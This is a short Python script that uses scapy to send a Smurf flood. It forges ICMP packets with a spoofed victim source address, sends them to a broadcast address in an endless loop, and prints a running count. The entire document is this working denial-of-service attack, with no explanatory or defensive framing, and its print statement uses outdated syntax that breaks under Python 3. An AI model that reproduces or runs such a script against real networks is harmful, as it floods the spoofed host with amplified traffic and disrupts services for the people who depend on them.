from scapy.all import *

def smurf(packet):
    sendp(packet)


eth = Ether()
ip = IP()
ip.src = '192.168.1.138'
ip.dst = '172.16.1.255'
icmp = ICMP()


m = 0
while True:      
    packet = eth/ip/icmp
    smurf(packet)
    print ('sending SMURF TO %s') % ip.src
    m = m + 1
    print(m)
        
